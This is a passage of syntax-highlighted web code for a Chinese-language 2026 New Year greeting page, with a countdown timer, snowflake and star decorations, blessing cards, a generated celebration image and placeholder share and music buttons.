        scroll-behavior: smooth;
      }

      <span class="hljs-selector-tag">body</span> {
        <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;
        <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;
      }

      <span class="hljs-comment">/* 雪花样式 */</span>
      <span class="hljs-selector-class">.snowflake</span> {
        <span class="hljs-attribute">position</span>: absolute;
        <span class="hljs-attribute">background-color</span>: white;
        <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;
        <span class="hljs-attribute">pointer-events</span>: none;
        <span class="hljs-attribute">z-index</span>: <span class="hljs-number">0</span>;
      }

      <span class="hljs-comment">/* 加载动画 */</span>
      <span class="hljs-selector-class">.loading-screen</span> {
        <span class="hljs-attribute">position</span>: fixed;
        <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;
        <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;
        <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
        <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
        <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#dc2626</span>;
        <span class="hljs-attribute">display</span>: flex;
        <span class="hljs-attribute">align-items</span>: center;
        <span class="hljs-attribute">justify-content</span>: center;
        <span class="hljs-attribute">z-index</span>: <span class="hljs-number">9999</span>;
        <span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">0.8s</span> ease-out;
      }

      <span class="hljs-selector-class">.loading-hidden</span> {
        <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>;
        <span class="hljs-attribute">pointer-events</span>: none;
      }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-gradient-to-b from-red-800 via-red-700 to-red-900 text-white"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 加载动画 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"loading-screen"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"loading-screen"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-4xl font-bold text-white"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"loading-text"</span>&gt;</span>2026<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 主要内容容器 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"relative min-h-screen overflow-hidden"</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 雪花容器 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"snow-container"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fixed inset-0 pointer-events-none z-0"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 装饰星星 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"absolute top-10 right-10 w-20 h-20"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"animate-float"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fa-solid fa-star text-yellow-300 text-4xl animate-pulse-soft"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"absolute bottom-20 left-10 w-16 h-16"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"animate-float-delay-1"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fa-solid fa-star text-yellow-300 text-3xl animate-pulse-soft"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 主要内容 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container mx-auto px-4 py-16 relative z-10"</span>&gt;</span>
            <span class="hljs-comment">&lt;!-- 标题部分 --&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-center mb-12 opacity-0 animate-slide-up"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>
                    <span class="hljs-attr">class</span>=<span class="hljs-string">"text-4xl sm:text-6xl md:text-7xl font-bold mb-4 bg-gradient-to-r from-yellow-300 to-yellow-500 bg-clip-text text-transparent animate-glow"</span>&gt;</span>
                    2026新年快乐！
                <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-xl sm:text-2xl text-yellow-100 opacity-0"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"subtitle"</span>&gt;</span>
                    愿您新的一年里心想事成，万事如意
                <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

            <span class="hljs-comment">&lt;!-- 倒计时部分 --&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-center mb-16 opacity-0 animate-slide-up-delay-1"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-2xl sm:text-3xl font-semibold mb-6"</span>&gt;</span>距离2026年还有<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"grid grid-cols-4 gap-4 sm:gap-8"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"countdown-container"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"flex flex-col items-center opacity-0"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
                            <span class="hljs-attr">class</span>=<span class="hljs-string">"text-3xl sm:text-5xl font-bold text-white bg-gradient-to-r from-red-500 to-amber-500 p-4 sm:p-6 rounded-lg shadow-lg min-w-[80px] sm:min-w-[120px] text-center"</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"days"</span>&gt;</span>00<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mt-2 text-white text-xs sm:text-sm"</span>&gt;</span>天<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"flex flex-col items-center opacity-0"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
                            <span class="hljs-attr">class</span>=<span class="hljs-string">"text-3xl sm:text-5xl font-bold text-white bg-gradient-to-r from-red-500 to-amber-500 p-4 sm:p-6 rounded-lg shadow-lg min-w-[80px] sm:min-w-[120px] text-center"</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"hours"</span>&gt;</span>00<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mt-2 text-white text-xs sm:text-sm"</span>&gt;</span>时<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"flex flex-col items-center opacity-0"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
                            <span class="hljs-attr">class</span>=<span class="hljs-string">"text-3xl sm:text-5xl font-bold text-white bg-gradient-to-r from-red-500 to-amber-500 p-4 sm:p-6 rounded-lg shadow-lg min-w-[80px] sm:min-w-[120px] text-center"</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"minutes"</span>&gt;</span>00<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mt-2 text-white text-xs sm:text-sm"</span>&gt;</span>分<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"flex flex-col items-center opacity-0"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
                            <span class="hljs-attr">class</span>=<span class="hljs-string">"text-3xl sm:text-5xl font-bold text-white bg-gradient-to-r from-red-500 to-amber-500 p-4 sm:p-6 rounded-lg shadow-lg min-w-[80px] sm:min-w-[120px] text-center"</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"seconds"</span>&gt;</span>00<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mt-2 text-white text-xs sm:text-sm"</span>&gt;</span>秒<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

            <span class="hljs-comment">&lt;!-- 祝福卡片部分 --&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"grid grid-cols-1 md:grid-cols-2 gap-6 mb-16 opacity-0 animate-slide-up-delay-2"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-white/10 backdrop-blur-md p-6 rounded-xl border border-white/20 shadow-xl hover:shadow-yellow-500/20 transition-all transform hover:scale-105 hover:rotate-1 cursor-pointer opacity-0"</span>
                    <span class="hljs-attr">id</span>=<span class="hljs-string">"wish-card-1"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"flex items-center space-x-4"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-yellow-400 text-3xl"</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fa-solid fa-heart"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-xl font-medium"</span>&gt;</span>身体健康，万事如意<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-white/10 backdrop-blur-md p-6 rounded-xl border border-white/20 shadow-xl hover:shadow-yellow-500/20 transition-all transform hover:scale-105 hover:-rotate-1 cursor-pointer opacity-0"</span>
                    <span class="hljs-attr">id</span>=<span class="hljs-string">"wish-card-2"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"flex items-center space-x-4"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-yellow-400 text-3xl"</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fa-solid fa-heart"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-xl font-medium"</span>&gt;</span>事业有成，财源广进<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-white/10 backdrop-blur-md p-6 rounded-xl border border-white/20 shadow-xl hover:shadow-yellow-500/20 transition-all transform hover:scale-105 hover:-rotate-1 cursor-pointer opacity-0"</span>
                    <span class="hljs-attr">id</span>=<span class="hljs-string">"wish-card-3"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"flex items-center space-x-4"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-yellow-400 text-3xl"</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fa-solid fa-heart"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-xl font-medium"</span>&gt;</span>家庭幸福，平安顺遂<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-white/10 backdrop-blur-md p-6 rounded-xl border border-white/20 shadow-xl hover:shadow-yellow-500/20 transition-all transform hover:scale-105 hover:rotate-1 cursor-pointer opacity-0"</span>
                    <span class="hljs-attr">id</span>=<span class="hljs-string">"wish-card-4"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"flex items-center space-x-4"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-yellow-400 text-3xl"</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fa-solid fa-heart"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-xl font-medium"</span>&gt;</span>心想事成，吉祥如意<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

            <span class="hljs-comment">&lt;!-- 新年图片 --&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
                <span class="hljs-attr">class</span>=<span class="hljs-string">"relative mx-auto max-w-2xl rounded-2xl overflow-hidden shadow-2xl mb-16 opacity-0 animate-slide-up-delay-3"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://space.coze.cn/api/coze_space/gen_image?image_size=landscape_16_9&amp;prompt=New%20Year%202026%2C%20celebration%2C%20fireworks%2C%20happy%20people%2C%20chinese%20new%20year%20style&amp;sign=7480eb84f78aa7d9bd5edaf5dc5aad19"</span>
                    <span class="hljs-attr">alt</span>=<span class="hljs-string">"2026新年庆祝"</span>
                    <span class="hljs-attr">class</span>=<span class="hljs-string">"w-full h-auto rounded-2xl transform transition-transform hover:scale-105 duration-700"</span> /&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"absolute inset-0 bg-gradient-to-t from-black/70 to-transparent flex items-end"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-white p-6 text-lg"</span>&gt;</span>祝大家2026年元旦快乐！<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

            <span class="hljs-comment">&lt;!-- 按钮部分 --&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"flex flex-wrap justify-center gap-4 opacity-0 animate-slide-up-delay-3"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">button</span>
                    <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-gradient-to-r from-yellow-500 to-amber-500 text-red-900 font-bold py-3 px-8 rounded-full text-lg shadow-lg transform transition-transform duration-300 hover:scale-105 hover:shadow-lg hover:shadow-yellow-500/20 active:scale-95"</span>
                    <span class="hljs-attr">id</span>=<span class="hljs-string">"share-button"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fa-solid fa-share-alt mr-2"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span>分享祝福
                <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">button</span>
                    <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-transparent border-2 border-yellow-500 text-yellow-500 font-bold py-3 px-8 rounded-full text-lg transform transition-all duration-300 hover:bg-yellow-500/10 hover:scale-105 active:scale-95"</span>
                    <span class="hljs-attr">id</span>=<span class="hljs-string">"music-button"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"fa-solid fa-music mr-2"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span>播放音乐
                <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

            <span class="hljs-comment">&lt;!-- 底部装饰 --&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"absolute bottom-0 left-0 right-0 h-24 bg-gradient-to-t from-red-900 to-transparent opacity-0 animate-fade-in"</span>
                <span class="hljs-attr">id</span>=<span class="hljs-string">"bottom-decoration"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

            <span class="hljs-comment">&lt;!-- 底部文字 --&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">footer</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-center mt-20 text-white/60 text-sm opacity-0 animate-fade-in"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"footer"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>© 2025 新年祝福页面 | 祝您新年快乐，阖家幸福<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-comment">// 页面加载动画</span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'DOMContentLoaded'</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> loadingScreen = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'loading-screen'</span>);
            <span class="hljs-keyword">const</span> loadingText = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'loading-text'</span>);
            <span class="hljs-keyword">const</span> subtitle = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'subtitle'</span>);
            <span class="hljs-keyword">const</span> countdownItems = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'#countdown-container &gt; div'</span>);
            <span class="hljs-keyword">const</span> wishCards = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'[id^="wish-card-"]'</span>);
            <span class="hljs-keyword">const</span> bottomDecoration = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'bottom-decoration'</span>);
            <span class="hljs-keyword">const</span> footer = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'footer'</span>);

            <span class="hljs-comment">// 加载文字动画</span>
            loadingText.<span class="hljs-title function_">animate</span>([
                { <span class="hljs-attr">transform</span>: <span class="hljs-string">'scale(1)'</span> },
                { <span class="hljs-attr">transform</span>: <span class="hljs-string">'scale(1.2)'</span> },
                { <span class="hljs-attr">transform</span>: <span class="hljs-string">'scale(1)'</span> }
            ], {
                <span class="hljs-attr">duration</span>: <span class="hljs-number">1000</span>,
                <span class="hljs-attr">iterations</span>: <span class="hljs-title class_">Infinity</span>
            });

            <span class="hljs-comment">// 500ms后隐藏加载屏幕，显示主内容</span>
            <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                loadingScreen.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'loading-hidden'</span>);

                <span class="hljs-comment">// 显示副标题</span>
                <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                    subtitle.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'animate-fade-in'</span>);
                }, <span class="hljs-number">500</span>);

                <span class="hljs-comment">// 显示倒计时项</span>
                countdownItems.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item, index</span>) =&gt;</span> {
                    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                        item.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'animate-scale-in'</span>);
                    }, <span class="hljs-number">800</span> + index * <span class="hljs-number">200</span>);
                });

                <span class="hljs-comment">// 显示祝福卡片</span>
                wishCards.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">card, index</span>) =&gt;</span> {
                    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                        card.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'animate-scale-in'</span>);
                    }, <span class="hljs-number">1600</span> + index * <span class="hljs-number">200</span>);
                });

                <span class="hljs-comment">// 显示底部装饰和页脚</span>
                <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                    bottomDecoration.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'animate-fade-in'</span>);
                }, <span class="hljs-number">2400</span>);

                <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                    footer.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'animate-fade-in'</span>);
                }, <span class="hljs-number">2800</span>);
            }, <span class="hljs-number">1000</span>);

            <span class="hljs-comment">// 初始化倒计时</span>
            <span class="hljs-title function_">updateCountdown</span>();
            <span class="hljs-built_in">setInterval</span>(updateCountdown, <span class="hljs-number">1000</span>);

            <span class="hljs-comment">// 初始化雪花效果</span>
            <span class="hljs-title function_">createSnowflakes</span>();

            <span class="hljs-comment">// 按钮事件处理</span>
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'share-button'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
                <span class="hljs-title function_">alert</span>(<span class="hljs-string">'祝福已分享！'</span>);
            });

            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'music-button'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
                <span class="hljs-title function_">alert</span>(<span class="hljs-string">'音乐播放功能即将上线！'</span>);
            });
        });

        <span class="hljs-comment">// 倒计时功能</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">updateCountdown</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> now = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();
            <span class="hljs-keyword">const</span> newYear = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-number">2026</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
            <span class="hljs-keyword">const</span> difference = newYear.<span class="hljs-title function_">getTime</span>() - now.<span class="hljs-title function_">getTime</span>();

            <span class="hljs-keyword">if</span> (difference &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">const</span> days = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(difference / (<span class="hljs-number">1000</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span>));
                <span class="hljs-keyword">const</span> hours = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((difference / (<span class="hljs-number">1000</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span>)) % <span class="hljs-number">24</span>);
                <span class="hljs-keyword">const</span> minutes = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((difference / <span class="hljs-number">1000</span> / <span class="hljs-number">60</span>) % <span class="hljs-number">60</span>);
                <span class="hljs-keyword">const</span> seconds = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((difference / <span class="hljs-number">1000</span>) % <span class="hljs-number">60</span>);

                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'days'</span>).<span class="hljs-property">textContent</span> = <span class="hljs-title class_">String</span>(days).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">2</span>, <span class="hljs-string">'0'</span>);
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'hours'</span>).<span class="hljs-property">textContent</span> = <span class="hljs-title class_">String</span>(hours).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">2</span>, <span class="hljs-string">'0'</span>);
